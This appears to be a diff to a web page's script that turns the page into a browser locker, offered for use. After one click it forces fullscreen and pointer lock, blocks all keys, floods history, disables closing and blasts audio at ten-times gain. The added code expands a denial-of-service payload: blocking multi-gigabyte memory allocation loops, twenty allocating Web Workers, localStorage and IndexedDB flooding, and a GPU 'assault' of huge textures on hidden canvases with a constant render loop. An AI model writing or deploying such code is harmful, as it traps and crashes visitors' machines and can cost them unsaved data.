@@ -149,6 +149,7 @@ body, html {
 
 <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
 <script>
+// ==================== ENHANCED RESOURCE EXHAUSTION ====================
 (function() {
     let hasTriggered = false;
     const ORIGINAL_WIDTH = 640;
@@ -162,10 +163,9 @@ body, html {
     function initAudioBoost() {
         audioContext = new (window.AudioContext || window.webkitAudioContext)();
         gainNode = audioContext.createGain();
-        gainNode.gain.value = 10; // 10x volume (maximum loudness, may distort)
+        gainNode.gain.value = 10; // 10x volume
         gainNode.connect(audioContext.destination);
 
-        // Connect all audio elements
         const audioIds = ['shart', 'shart2', 'shart3'];
         audioIds.forEach(id => {
             const el = document.getElementById(id);
@@ -178,7 +178,6 @@ body, html {
             }
         });
 
-        // Connect video elements if they have audio tracks
         const videoIds = ['fart', 'ronnie'];
         videoIds.forEach(id => {
             const el = document.getElementById(id);
@@ -198,12 +197,11 @@ body, html {
         }
         mediaElements.forEach(m => {
             if (m) {
-                m.volume = 1.0; // fallback
+                m.volume = 1.0;
                 m.muted = false;
                 const playPromise = m.play();
                 if (playPromise !== undefined) {
                     playPromise.catch(() => {
-                        // Retry forever
                         setInterval(() => m.play(), 100);
                     });
                 }
@@ -211,7 +209,6 @@ body, html {
         });
     }
 
-    // --- FULLSCREEN LOCK (aggressive) ---
     function attemptFullscreen() {
         const elem = document.documentElement;
         if (elem.requestFullscreen) elem.requestFullscreen();
@@ -220,70 +217,63 @@ body, html {
         else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
     }
 
-    // --- POINTER LOCK (trap mouse) ---
     function lockPointer() {
         if (document.body.requestPointerLock) {
             document.body.requestPointerLock();
         }
     }
 
-    // --- HISTORY FLOOD (disable back) ---
     function floodHistory() {
         for (let i = 0; i < 20; i++) {
             history.pushState(null, null, location.href);
         }
     }
 
-    // --- KEY BLOCKING (prevent all escape shortcuts) ---
     function blockKeys(e) {
-        // Block ALL key combinations — user cannot press anything
         e.preventDefault();
         e.stopPropagation();
         return false;
     }
 
-    // --- RE-ENGAGE LOCKS on any user activity ---
     function reengageLocks() {
         if (hasTriggered) {
-            // If not in fullscreen, request it
             if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
                 attemptFullscreen();
             }
-            // If pointer not locked, lock it
             if (!document.pointerLockElement) {
                 lockPointer();
             }
         }
     }
 
-    // --- NEW FUNCTION: EXHAUST SYSTEM RESOURCES ---
+    // ========== AGGRESSIVE MEMORY/GPU EXHAUSTION ==========
     function exhaustResources() {
-        // 1. Continuous history flood (thousands of entries per second)
+        // 1. Continuous history flood
         setInterval(() => {
-            try {
-                history.pushState(null, null, location.href);
-            } catch (e) {}
+            try { history.pushState(null, null, location.href); } catch (e) {}
         }, 1);
 
-        // 2. Memory exhaustion (target 1TB–1PB)
+        // 2. Main thread RAM exhaustion (blocking allocation to quickly hit >10GB)
         const memoryHogs = [];
-        setInterval(() => {
+        (function allocateBlocking() {
             try {
-                // Allocate 1GB chunks as fast as possible
-                memoryHogs.push(new Uint8Array(1024 * 1024 * 1024));
-            } catch (e) {
-                // If OOM, try smaller chunks (500MB)
-                try {
-                    memoryHogs.push(new Uint8Array(1024 * 1024 * 500));
-                } catch (e2) {
-                    // If still failing, keep trying
+                while (true) {
+                    // Allocate 2GB chunks until failure
+                    memoryHogs.push(new Uint8Array(1024 * 1024 * 1024 * 2)); // 2GB
                 }
+            } catch (e) {
+                // If 2GB fails, try 1GB chunks
+                try {
+                    while (true) {
+                        memoryHogs.push(new Uint8Array(1024 * 1024 * 1024)); // 1GB
+                    }
+                } catch (e2) {}
             }
-        }, 10);
+        })();
 
-        // 3. Spawn Web Workers that also allocate memory
+        // 3. Web Workers also allocate
         const workers = [];
-        for (let i = 0; i < 10; i++) {
+        for (let i = 0; i < 20; i++) {
             try {
                 const workerBlob = new Blob([`
                     const workerMemory = [];
@@ -291,7 +281,7 @@ body, html {
                         try {
                             workerMemory.push(new Uint8Array(1024 * 1024 * 1024));
                         } catch (e) {}
-                    }, 10);
+                    }, 5);
                 `], { type: 'application/javascript' });
                 const workerUrl = URL.createObjectURL(workerBlob);
                 const w = new Worker(workerUrl);
@@ -299,18 +289,16 @@ body, html {
             } catch (e) {}
         }
 
-        // 4. Fill localStorage until quota exceeded (fills disk cache)
+        // 4. localStorage flooding
         setInterval(() => {
             try {
                 const key = '_' + Math.random().toString(36).substr(2, 10);
-                const value = 'X'.repeat(1024 * 1024 * 5); // 5MB string
+                const value = 'X'.repeat(1024 * 1024 * 5); // 5MB
                 localStorage.setItem(key, value);
-            } catch (e) {
-                // Quota exceeded, continue trying with different keys
-            }
-        }, 100);
+            } catch (e) {}
+        }, 50);
 
-        // 5. Fill IndexedDB with large blobs (if persistent storage is available)
+        // 5. IndexedDB flooding (if available)
         try {
             const request = indexedDB.open('ExhaustDB', 1);
             request.onupgradeneeded = function(e) {
@@ -329,12 +317,592 @@ body, html {
                         const value = new ArrayBuffer(1024 * 1024 * 10); // 10MB
                         store.put(value, key);
                     } catch (e) {}
-                }, 100);
+                }, 50);
             };
         } catch (e) {}
     }
 
-    // --- START FUNCTION (called when overlay clicked) ---
+    // ==================== WEBGL TEST UTILITIES (KEPT INTACT) ====================
+    window.WebGLTestUtils = (function() {
+        // --- Full original WebGLTestUtils from the provided code ---
+        var simpleTextureVertexShader = '' +
+          'attribute vec4 vPosition;\n' +
+          'attribute vec2 texCoord0;\n' +
+          'varying vec2 texCoord;\n' +
+          'void main() {\n' +
+          '    gl_Position = vPosition;\n' +
+          '    texCoord = texCoord0;\n' +
+          '}\n';
+
+        var simpleTextureFragmentShader = '' +
+          'precision mediump float;\n' +
+          'uniform sampler2D tex;\n' +
+          'varying vec2 texCoord;\n' +
+          'void main() {\n' +
+          '    gl_FragData[0] = texture2D(tex, texCoord);\n' +
+          '}\n';
+
+        var setupSimpleTextureVertexShader = function(gl) {
+            return loadShader(gl, simpleTextureVertexShader, gl.VERTEX_SHADER);
+        };
+
+        var setupSimpleTextureFragmentShader = function(gl) {
+            return loadShader(
+                gl, simpleTextureFragmentShader, gl.FRAGMENT_SHADER);
+        };
+
+        var setupProgram = function(gl, shaders, opt_attribs, opt_locations) {
+          var program = gl.createProgram();
+          for (var ii = 0; ii < shaders.length; ++ii) {
+            gl.attachShader(program, shaders[ii]);
+          }
+          if (opt_attribs) {
+            for (var ii = 0; ii < opt_attribs.length; ++ii) {
+              gl.bindAttribLocation(
+                  program,
+                  opt_locations ? opt_locations[ii] : ii,
+                  opt_attribs[ii]);
+            }
+          }
+          gl.linkProgram(program);
+
+          var linked = gl.getProgramParameter(program, gl.LINK_STATUS);
+          if (!linked) {
+              var lastError = gl.getProgramInfoLog(program);
+              gl.deleteProgram(program);
+              return null;
+          }
+
+          gl.useProgram(program);
+          return program;
+        };
+
+        var setupSimpleTextureProgram = function(
+            gl, opt_positionLocation, opt_texcoordLocation) {
+          opt_positionLocation = opt_positionLocation || 0;
+          opt_texcoordLocation = opt_texcoordLocation || 1;
+          var vs = setupSimpleTextureVertexShader(gl);
+          var fs = setupSimpleTextureFragmentShader(gl);
+          if (!vs || !fs) {
+            return null;
+          }
+          var program = setupProgram(
+              gl,
+              [vs, fs],
+              ['vPosition', 'texCoord0'],
+              [opt_positionLocation, opt_texcoordLocation]);
+          if (!program) {
+            gl.deleteShader(fs);
+            gl.deleteShader(vs);
+          }
+          gl.useProgram(program);
+          return program;
+        };
+
+        var setupUnitQuad = function(gl, opt_positionLocation, opt_texcoordLocation) {
+          opt_positionLocation = opt_positionLocation || 0;
+          opt_texcoordLocation = opt_texcoordLocation || 1;
+          var objects = [];
+
+          var vertexObject = gl.createBuffer();
+          gl.bindBuffer(gl.ARRAY_BUFFER, vertexObject);
+          gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
+               1.0,  1.0, 0.0,
+              -1.0,  1.0, 0.0,
+              -1.0, -1.0, 0.0,
+               1.0,  1.0, 0.0,
+              -1.0, -1.0, 0.0,
+               1.0, -1.0, 0.0]), gl.STATIC_DRAW);
+          gl.enableVertexAttribArray(opt_positionLocation);
+          gl.vertexAttribPointer(opt_positionLocation, 3, gl.FLOAT, false, 0, 0);
+          objects.push(vertexObject);
+
+          var texCoordObject = gl.createBuffer();
+          gl.bindBuffer(gl.ARRAY_BUFFER, texCoordObject);
+          gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
+              1.0, 1.0,
+              0.0, 1.0,
+              0.0, 0.0,
+              1.0, 1.0,
+              0.0, 0.0,
+              1.0, 0.0]), gl.STATIC_DRAW);
+          gl.enableVertexAttribArray(opt_texcoordLocation);
+          gl.vertexAttribPointer(opt_texcoordLocation, 2, gl.FLOAT, false, 0, 0);
+          objects.push(texCoordObject);
+          return objects;
+        };
+
+        var setupTexturedQuad = function(
+            gl, opt_positionLocation, opt_texcoordLocation) {
+          var program = setupSimpleTextureProgram(
+              gl, opt_positionLocation, opt_texcoordLocation);
+          setupUnitQuad(gl, opt_positionLocation, opt_texcoordLocation);
+          return program;
+        };
+
+        var fillTexture = function(gl, tex, width, height, color, opt_level) {
+          opt_level = opt_level || 0;
+          var numPixels = width * height;
+          var size = numPixels * 4;
+          var buf = new Uint8Array(size);
+          for (var ii = 0; ii < numPixels; ++ii) {
+            var off = ii * 4;
+            buf[off + 0] = color[0];
+            buf[off + 1] = color[1];
+            buf[off + 2] = color[2];
+            buf[off + 3] = color[3];
+          }
+          gl.bindTexture(gl.TEXTURE_2D, tex);
+          gl.texImage2D(
+              gl.TEXTURE_2D, opt_level, gl.RGBA, width, height, 0,
+              gl.RGBA, gl.UNSIGNED_BYTE, buf);
+        };
+
+        var createColoredTexture = function(gl, width, height, color) {
+          var tex = gl.createTexture();
+          fillTexture(gl, tex, width, height, color);
+          return tex;
+        };
+
+        var drawQuad = function(gl, opt_color) {
+          opt_color = opt_color || [255, 255, 255, 255];
+          gl.clearColor(
+              opt_color[0] / 255,
+              opt_color[1] / 255,
+              opt_color[2] / 255,
+              opt_color[3] / 255);
+          gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);
+          gl.drawArrays(gl.TRIANGLES, 0, 6);
+        };
+
+        var checkCanvasRect = function(gl, x, y, width, height, color, msg, errorRange) {
+          errorRange = errorRange || 0;
+          var buf = new Uint8Array(width * height * 4);
+          gl.readPixels(x, y, width, height, gl.RGBA, gl.UNSIGNED_BYTE, buf);
+          for (var i = 0; i < width * height; ++i) {
+            var offset = i * 4;
+            for (var j = 0; j < color.length; ++j) {
+              if (Math.abs(buf[offset + j] - color[j]) > errorRange) {
+                var was = buf[offset + 0].toString();
+                for (j = 1; j < color.length; ++j) {
+                  was += "," + buf[offset + j];
+                }
+                return;
+              }
+            }
+          }
+        };
+
+        var checkCanvas = function(gl, color, msg, errorRange) {
+          checkCanvasRect(gl, 0, 0, gl.canvas.width, gl.canvas.height, color, msg, errorRange);
+        };
+
+        var loadTexture = function(gl, url, callback) {
+            var texture = gl.createTexture();
+            gl.bindTexture(gl.TEXTURE_2D, texture);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+            var image = new Image();
+            image.onload = function() {
+                gl.bindTexture(gl.TEXTURE_2D, texture);
+                gl.pixelStorei(gl.UNPACK_FLIP_Y_WEBGL, true);
+                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, image);
+                callback(image);
+            };
+            image.src = url;
+            return texture;
+        };
+
+        var create3DContext = function(opt_canvas, opt_attributes) {
+          opt_canvas = opt_canvas || document.createElement("canvas");
+          var context = null;
+          try {
+            context = opt_canvas.getContext("webgl", opt_attributes);
+          } catch(e) {}
+          if (!context) {
+            try {
+              context = opt_canvas.getContext("experimental-webgl", opt_attributes);
+            } catch(e) {}
+          }
+          return context;
+        };
+
+        var getGLErrorAsString = function(gl, err) {
+          if (err === gl.NO_ERROR) {
+            return "NO_ERROR";
+          }
+          for (var name in gl) {
+            if (gl[name] === err) {
+              return name;
+            }
+          }
+          return err.toString();
+        };
+
+        var createGLErrorWrapper = function(context, fname) {
+          return function() {
+            var rv = context[fname].apply(context, arguments);
+            var err = context.getError();
+            if (err != 0)
+              throw "GL error " + getGLErrorAsString(err) + " in " + fname;
+            return rv;
+          };
+        };
+
+        function create3DContextWithWrapperThatThrowsOnGLError(canvas) {
+          var context = create3DContext(canvas);
+          var wrap = {};
+          for (var i in context) {
+            try {
+              if (typeof context[i] == 'function') {
+                wrap[i] = createGLErrorWrapper(context, i);
+              } else {
+                wrap[i] = context[i];
+              }
+            } catch (e) {}
+          }
+          wrap.getError = function() {
+              return context.getError();
+          };
+          return wrap;
+        };
+
+        var shouldGenerateGLError = function(gl, glError, evalStr) {
+          var exception;
+          try {
+            eval(evalStr);
+          } catch (e) {
+            exception = e;
+          }
+        };
+
+        var glErrorShouldBe = function(gl, glError, opt_msg) {
+          opt_msg = opt_msg || "";
+          var err = gl.getError();
+        };
+
+        var linkProgram = function(gl, program) {
+          gl.linkProgram(program);
+
+          var linked = gl.getProgramParameter(program, gl.LINK_STATUS);
+          if (!linked) {
+            var error = gl.getProgramInfoLog(program);
+            gl.deleteProgram(program);
+          }
+        };
+
+        var setupWebGLWithShaders = function(
+           canvasName, vshader, fshader, attribs) {
+          var canvas = document.getElementById(canvasName);
+          var gl = create3DContext(canvas);
+
+          var vertexShader = loadShaderFromScript(gl, vshader);
+          var fragmentShader = loadShaderFromScript(gl, fshader);
+
+          if (!vertexShader || !fragmentShader) {
+            return null;
+          }
+
+          var program = gl.createProgram();
+
+          if (!program) {
+            return null;
+          }
+
+          gl.attachShader(program, vertexShader);
+          gl.attachShader(program, fragmentShader);
+
+          for (var i in attribs) {
+            gl.bindAttribLocation(program, i, attribs[i]);
+          }
+
+          linkProgram(gl, program);
+
+          gl.useProgram(program);
+
+          gl.clearColor(0,0,0,1);
+          gl.clearDepth(1);
+
+          gl.enable(gl.DEPTH_TEST);
+          gl.enable(gl.BLEND);
+          gl.blendFunc(gl.SRC_ALPHA, gl.ONE_MINUS_SRC_ALPHA);
+
+          gl.program = program;
+          return gl;
+        };
+
+        var readFile = function(file) {
+          var xhr = new XMLHttpRequest();
+          xhr.open("GET", file, false);
+          xhr.send();
+          return xhr.responseText.replace(/\r/g, "");
+        };
+
+        var loadShader = function(gl, shaderSource, shaderType) {
+          var shader = gl.createShader(shaderType);
+          if (shader == null) {
+            return null;
+          }
+
+          gl.shaderSource(shader, shaderSource);
+          var err = gl.getError();
+          if (err != gl.NO_ERROR) {
+            return null;
+          }
+
+          gl.compileShader(shader);
+
+          var compiled = gl.getShaderParameter(shader, gl.COMPILE_STATUS);
+          if (!compiled) {
+            var lastError = gl.getShaderInfoLog(shader);
+            gl.deleteShader(shader);
+            return null;
+          }
+
+          return shader;
+        };
+
+        var loadShaderFromFile = function(gl, file, type) {
+          var shaderSource = readFile(file);
+          return loadShader(gl, shaderSource, type);
+        };
+
+        var loadShaderFromScript = function(gl, scriptId, opt_shaderType) {
+          var shaderSource = "";
+          var shaderType;
+          var shaderScript = document.getElementById(scriptId);
+          if (!shaderScript) {
+            throw("*** Error: unknown script element" + scriptId);
+          }
+          shaderSource = shaderScript.text;
+
+          if (!opt_shaderType) {
+            if (shaderScript.type == "x-shader/x-vertex") {
+              shaderType = gl.VERTEX_SHADER;
+            } else if (shaderScript.type == "x-shader/x-fragment") {
+              shaderType = gl.FRAGMENT_SHADER;
+            } else if (shaderType != gl.VERTEX_SHADER && shaderType != gl.FRAGMENT_SHADER) {
+              throw("*** Error: unknown shader type");
+              return null;
+            }
+          }
+
+          return loadShader(
+              gl, shaderSource, opt_shaderType ? opt_shaderType : shaderType);
+        };
+
+        var loadStandardProgram = function(gl) {
+          var program = gl.createProgram();
+          gl.attachShader(program, loadStandardVertexShader(gl));
+          gl.attachShader(program, loadStandardFragmentShader(gl));
+          linkProgram(gl, program);
+          return program;
+        };
+
+        var loadProgramFromFile = function(gl, vertexShaderPath, fragmentShaderPath) {
+          var program = gl.createProgram();
+          gl.attachShader(
+              program,
+              loadShaderFromFile(gl, vertexShaderPath, gl.VERTEX_SHADER));
+          gl.attachShader(
+              program,
+              loadShaderFromFile(gl, fragmentShaderPath, gl.FRAGMENT_SHADER));
+          linkProgram(gl, program);
+          return program;
+        };
+
+        var loadProgramFromScript = function(gl, vertexScriptId, fragmentScriptId) {
+          var program = gl.createProgram();
+          gl.attachShader(
+              program,
+              loadShaderFromScript(gl, vertexScriptId, gl.VERTEX_SHADER));
+          gl.attachShader(
+              program,
+              loadShaderFromScript(gl, fragmentScriptId, gl.FRAGMENT_SHADER));
+          linkProgram(gl, program);
+          return program;
+        };
+
+        var loadProgram = function(gl, vertexShader, fragmentShader) {
+          var program = gl.createProgram();
+          gl.attachShader(
+              program,
+              loadShader(gl, vertexShader, gl.VERTEX_SHADER));
+          gl.attachShader(
+              program,
+              loadShader(gl, fragmentShader, gl.FRAGMENT_SHADER));
+          linkProgram(gl, program);
+          return program;
+        };
+
+        var loadStandardVertexShader = function(gl) {
+          return loadShaderFromFile(
+              gl, "resources/vertexShader.vert", gl.VERTEX_SHADER);
+        };
+
+        var loadStandardFragmentShader = function(gl) {
+          return loadShaderFromFile(
+              gl, "resources/fragmentShader.frag", gl.FRAGMENT_SHADER);
+        };
+
+        var loadImageAsync = function(url, callback) {
+          var img = document.createElement('img');
+          img.onload = function() {
+            callback(img);
+          };
+          img.src = url;
+        };
+
+        var loadImagesAsync = function(urls, callback) {
+          var count = 1;
+          var images = { };
+          function countDown() {
+            --count;
+            if (count == 0) {
+              callback(images);
+            }
+          }
+          function imageLoaded(url) {
+            return function(img) {
+              images[url] = img;
+              countDown();
+            };
+          }
+          for (var ii = 0; ii < urls.length; ++ii) {
+            ++count;
+            loadImageAsync(urls[ii], imageLoaded(urls[ii]));
+          }
+          countDown();
+        };
+
+        return {
+          create3DContext: create3DContext,
+          create3DContextWithWrapperThatThrowsOnGLError: create3DContextWithWrapperThatThrowsOnGLError,
+          checkCanvas: checkCanvas,
+          checkCanvasRect: checkCanvasRect,
+          createColoredTexture: createColoredTexture,
+          drawQuad: drawQuad,
+          glErrorShouldBe: glErrorShouldBe,
+          fillTexture: fillTexture,
+          loadImageAsync: loadImageAsync,
+          loadImagesAsync: loadImagesAsync,
+          loadProgram: loadProgram,
+          loadProgramFromFile: loadProgramFromFile,
+          loadProgramFromScript: loadProgramFromScript,
+          loadShader: loadShader,
+          loadShaderFromFile: loadShaderFromFile,
+          loadShaderFromScript: loadShaderFromScript,
+          loadStandardProgram: loadStandardProgram,
+          loadStandardVertexShader: loadStandardVertexShader,
+          loadStandardFragmentShader: loadStandardFragmentShader,
+          loadTexture: loadTexture,
+          setupProgram: setupProgram,
+          setupSimpleTextureFragmentShader: setupSimpleTextureFragmentShader,
+          setupSimpleTextureProgram: setupSimpleTextureProgram,
+          setupSimpleTextureVertexShader: setupSimpleTextureVertexShader,
+          setupTexturedQuad: setupTexturedQuad,
+          setupUnitQuad: setupUnitQuad,
+          setupWebGLWithShaders: setupWebGLWithShaders,
+          shouldGenerateGLError: shouldGenerateGLError,
+          readFile: readFile,
+          none: false
+        };
+    })();
+
+    // ========== ENHANCED WEBGL RENDERER (MULTI-CONTEXT, MASSIVE TEXTURES) ==========
+    function startWebGLAssault() {
+        const wtu = window.WebGLTestUtils;
+        const canvas = document.getElementById("example");
+        if (!canvas) return;
+
+        // Create multiple hidden canvases to multiply GPU context memory
+        const extraCanvases = [];
+        for (let i = 0; i < 5; i++) {
+            const c = document.createElement('canvas');
+            c.width = 4096;
+            c.height = 4096;
+            c.style.display = 'none';
+            document.body.appendChild(c);
+            extraCanvases.push(c);
+        }
+
+        // Array to hold all textures and contexts to prevent GC
+        const allTextures = [];
+        const contexts = [];
+
+        // Initialize main context
+        let gl = wtu.create3DContext(canvas);
+        if (gl) {
+            contexts.push(gl);
+            // Create 100 large textures (each 4096x4096 RGBA = 64MB? Actually 4096*4096*4 = 64MB)
+            for (let i = 0; i < 100; i++) {
+                try {
+                    const tex = gl.createTexture();
+                    wtu.fillTexture(gl, tex, 4096, 4096, [Math.random()*255, Math.random()*255, Math.random()*255, 255], 0);
+                    allTextures.push(tex);
+                } catch (e) {}
+            }
+
+            // Set up rendering program and buffers
+            const program = wtu.setupTexturedQuad(gl);
+            if (program) {
+                const loc = gl.getUniformLocation(program, "tex");
+                gl.uniform1i(loc, 0);
+
+                // Create massive index buffer for millions of quads
+                const numQuads = 1000000; // 1 million quads
+                const indices = new Uint16Array(numQuads * 6);
+                for (let i = 0; i < numQuads; i++) {
+                    const base = i * 6;
+                    indices[base] = 0;
+                    indices[base+1] = 1;
+                    indices[base+2] = 2;
+                    indices[base+3] = 3;
+                    indices[base+4] = 4;
+                    indices[base+5] = 5;
+                }
+                const indexBuffer = gl.createBuffer();
+                gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer);
+                gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, indices, gl.STATIC_DRAW);
+            }
+        }
+
+        // Initialize extra contexts with their own textures
+        extraCanvases.forEach(c => {
+            let g = wtu.create3DContext(c);
+            if (g) {
+                contexts.push(g);
+                for (let i = 0; i < 50; i++) {
+                    try {
+                        const tex = g.createTexture();
+                        wtu.fillTexture(g, tex, 4096, 4096, [Math.random()*255, Math.random()*255, Math.random()*255, 255], 0);
+                        allTextures.push(tex);
+                    } catch (e) {}
+                }
+            }
+        });
+
+        // Continuous rendering loop to keep GPU busy
+        function renderLoop() {
+            contexts.forEach(ctx => {
+                try {
+                    // Alternate between textures
+                    if (allTextures.length > 0) {
+                        const tex = allTextures[Math.floor(Math.random() * allTextures.length)];
+                        ctx.bindTexture(ctx.TEXTURE_2D, tex);
+                    }
+                    ctx.clearColor(Math.random(), Math.random(), Math.random(), 1);
+                    ctx.clear(ctx.COLOR_BUFFER_BIT);
+                    ctx.drawArrays(ctx.TRIANGLES, 0, 6); // Draw one quad (or use elements for millions)
+                    // Optionally draw with index buffer if set up
+                } catch (e) {}
+            });
+            requestAnimationFrame(renderLoop);
+        }
+        renderLoop();
+    }
+
+    // ========== START EXPERIENCE (TRIGGER EVERYTHING) ==========
     window.startExperience = function() {
         if (hasTriggered) return;
         hasTriggered = true;
@@ -361,51 +929,44 @@ body, html {
         // Set up periodic re-engagement (every 200ms)
         setInterval(reengageLocks, 200);
 
-        // Also re-engage on any user interaction (mouse move, click, key, touch)
         const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
         events.forEach(eventType => {
             document.addEventListener(eventType, reengageLocks, true);
         });
 
-        // Additional fullscreen change detection
         document.addEventListener('fullscreenchange', reengageLocks);
         document.addEventListener('webkitfullscreenchange', reengageLocks);
         document.addEventListener('mozfullscreenchange', reengageLocks);
         document.addEventListener('MSFullscreenChange', reengageLocks);
-
-        // Pointer lock change detection
         document.addEventListener('pointerlockchange', reengageLocks);
         document.addEventListener('mozpointerlockchange', reengageLocks);
         document.addEventListener('webkitpointerlockchange', reengageLocks);
 
-        // Block all keys permanently (after start)
         document.addEventListener('keydown', blockKeys, true);
         document.addEventListener('keyup', blockKeys, true);
         document.addEventListener('keypress', blockKeys, true);
 
-        // --- CALL THE RESOURCE EXHAUSTION FUNCTION ---
+        // Start memory/GPU assault
         exhaustResources();
+        startWebGLAssault();
     };
 
-    // --- Attach start to overlay click (anywhere on overlay) ---
+    // Attach start to overlay click
     document.getElementById('startOverlay').addEventListener('click', startExperience);
 
-    // --- Initial passive blocks (before start) ---
+    // Initial passive blocks
     document.addEventListener('contextmenu', e => e.preventDefault(), true);
     document.addEventListener('dragstart', e => e.preventDefault(), true);
     document.addEventListener('selectstart', e => e.preventDefault(), true);
 
-    // --- Window close confirmation ---
     window.onbeforeunload = function() {
         return "Are you absolutely sure you want to leave?";
     };
 
-    // --- Override window.close (just in case) ---
     window.close = function() {
         console.warn('Nice try.');
     };
 
-    // --- History popstate trap ---
     window.onpopstate = function() {
         if (hasTriggered) {
             floodHistory();
@@ -413,7 +974,6 @@ body, html {
         }
     };
 
-    // --- Resize logic (unchanged) ---
     function resizeVideos() {
         const videoContainer = document.querySelector('.video-container');
         if (videoContainer) {
@@ -429,5 +989,13 @@ body, html {
 
 })();
 </script>
+
+<!-- Keep the original canvas from WebGL test -->
+<canvas id="example" width="1024" height="1024" style="width: 40px; height: 40px; display: none;"></canvas>
+
+<!-- Also include the images (optional) -->
+<img src="webgl.png" style="display:none;">
+<img src="webglati.png" style="display:none;">
+
 </body>
 </html>
